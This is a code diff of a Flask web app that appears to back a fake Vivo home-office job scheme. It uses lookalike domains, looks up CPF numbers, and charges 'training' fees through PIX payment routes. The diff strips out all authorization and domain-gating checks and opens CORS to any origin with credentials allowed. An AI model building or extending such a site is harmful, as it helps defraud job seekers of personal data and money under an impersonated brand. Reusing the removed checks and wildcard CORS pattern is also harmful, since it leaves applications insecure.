@@ -32,32 +32,14 @@ db.init_app(app)
 from werkzeug.middleware.proxy_fix import ProxyFix
 app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
 
-# Configurar CORS para permitir os novos domínios
+# Configurar CORS para permitir TODOS os domínios (sem restrições)
 @app.after_request
 def after_request(response):
-    # Lista de domínios permitidos
-    allowed_origins = [
-        'https://vivo-vagasbrasil.com',
-        'https://vivo-homeoffice.com',
-        'https://app.vivo-homeoffice.com',
-        'https://vivoalerta-700f959ef5fa.herokuapp.com',
-        'vivo-vagashomeoffice.com',
-        'vivo-oportunidades.com',
-        'app.vivo-vagashomeoffice.com',
-        'https://app.vivo-homeoffice.org',
-        'https://vivo-homeoffice.org',
-        'https://vivo-vagasbrasil.org',
-        'app.vivo-homeoffice.org',
-        'vivo-homeoffice.org',
-        'vivo-vagasbrasil.org'
-    ]
-    
-    origin = request.headers.get('Origin')
-    if origin in allowed_origins:
-        response.headers['Access-Control-Allow-Origin'] = origin
-        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
-        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
-        response.headers['Access-Control-Allow-Credentials'] = 'true'
+    # Permitir acesso de qualquer origem
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
+    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
     
     return response
 
@@ -75,9 +57,9 @@ with app.app_context():
 # Configurar logging
 logging.basicConfig(level=logging.INFO)
 
-# Função simples para verificar se o acesso está autorizado via sessão
+# Função para verificar acesso - TODAS as verificações removidas
 def check_access_authorization():
-    return session.get('authorized', False)
+    return True  # Sempre permitir acesso
 
 @app.route('/consultar_cpf/<cpf>')
 def consultar_cpf(cpf):
@@ -175,21 +157,10 @@ def get_domain():
 
 @app.route('/')
 def index():
-    # Se o acesso não for autorizado, retorna a página de erro
-    acesso = request.args.get('acesso')
-    
-    # Verifica se estamos em um ambiente de desenvolvimento ou produção
-    dev_domains = ['replit.dev', 'replit.com', 'localhost', '127.0.0.1']
-    prod_domains = ['herokuapp.com', 'vivo-vagasbrasil.com', 'vivo-vagashomeoffice.com', 'vivo-oportunidades.com', 'app.vivo-vagashomeoffice.com']
-    is_dev = any(domain in request.host for domain in dev_domains)
-    is_prod = any(domain in request.host for domain in prod_domains)
-    
-    if acesso == 'autorizado' or is_dev or is_prod:
-        session['authorized'] = True
-        # Renderizar a página inicial e incluir o script de detecção de dispositivo
-        return render_template('index.html')
-    else:
-        return render_template('error.html')
+    # Acesso livre para todos os domínios - sem verificações
+    session['authorized'] = True
+    # Renderizar a página inicial sempre
+    return render_template('index.html')
 
 @app.route('/error')
 def show_error():
@@ -262,14 +233,12 @@ def check_device():
 
 @app.route('/cadastro')
 def cadastro():
-    if not session.get('authorized'):
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     return render_template('cadastro.html')
     
 @app.route('/teste-aptidao', methods=['GET', 'POST'])
 def teste_aptidao():
-    if not session.get('authorized'):
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     # Se for POST, pegamos as informações do formulário anterior
     if request.method == 'POST':
         nome = request.form.get('nome', 'Candidato')
@@ -289,8 +258,7 @@ def teste_aptidao():
 @app.route('/resultado_teste', methods=['GET', 'POST'])
 def resultado_teste():
     try:
-        if not session.get('authorized'):
-            return render_template('error.html')
+        # Acesso livre - verificação de autorização removida
         
         # Dados simplificados para evitar sobrecarga no servidor
         nome = session.get('user_data', {}).get('nome', 'Candidato')
@@ -323,8 +291,7 @@ def resultado_teste():
                           
 @app.route('/recebedor', methods=['GET', 'POST'])
 def recebedor():
-    if not session.get('authorized'):
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     if request.method == 'POST':
         # Obter os dados do método de recebimento
         metodo_pagamento = request.form.get('metodo_pagamento', 'ted')
@@ -495,8 +462,7 @@ def finalizar():
 @app.route('/transacao')
 def transacao():
     """Rota para a página de transação de treinamento - R$ 79,90"""
-    if not check_access_authorization():
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     
     # Verificar se já existe uma transação de treinamento na sessão
     training_payment_data = session.get('training_payment_data', {})
@@ -566,8 +532,7 @@ def carregando_transacao():
 @app.route('/processo_transacao')
 def processo_transacao():
     """Processa a transação PIX de R$ 59,90 e redireciona para a página de pagamento"""
-    if not check_access_authorization():
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     
     try:
         # Obter dados do usuário da sessão
@@ -641,9 +606,7 @@ def carregando_treinamento():
                           
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
-    # Verificar autorização de acesso
-    if not check_access_authorization():
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
         
     try:
         # Obter dados do usuário da sessão
@@ -876,8 +839,7 @@ def cancel():
     
 @app.route('/carteira-digital')
 def carteira_digital():
-    if not session.get('authorized'):
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     # Obter parâmetros de sessão ou definir valores padrão
     nome = session.get('user_data', {}).get('nome', 'Candidato')
     cpf = session.get('user_data', {}).get('cpf', '')
@@ -890,8 +852,7 @@ def carteira_digital():
     
 @app.route('/carteira-digital-acesso')
 def carteira_digital_acesso():
-    if not session.get('authorized'):
-        return render_template('error.html')
+    # Acesso livre - verificação de autorização removida
     # Obter parâmetros de sessão ou definir valores padrão
     nome = session.get('user_data', {}).get('nome', 'Candidato')
     cpf = session.get('user_data', {}).get('cpf', '')
